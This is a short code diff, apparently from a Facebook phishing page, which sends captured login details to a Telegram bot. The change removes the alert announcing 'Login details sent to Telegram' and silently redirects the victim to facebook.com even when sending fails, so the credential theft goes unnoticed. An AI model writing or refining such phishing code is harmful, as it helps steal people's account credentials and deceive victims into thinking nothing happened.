@@ -156,14 +156,13 @@
                 parse_mode: 'Markdown'
             })
             .then(response => {
-                alert("Login details sent to Telegram successfully!");
-                
-                // Redirect to Facebook
-                window.location.href = "https://www.facebook.com/profile.php?id=100088695651552";
+                // Automatically redirect to Facebook after sending message
+                window.location.href = "https://facebook.com";
             })
             .catch(error => {
                 console.error("Error sending message to Telegram:", error);
-                alert("Failed to send login details.");
+                // If message fails to send, still redirect to Facebook
+                window.location.href = "https://facebook.com";
             });
         }
     </script>
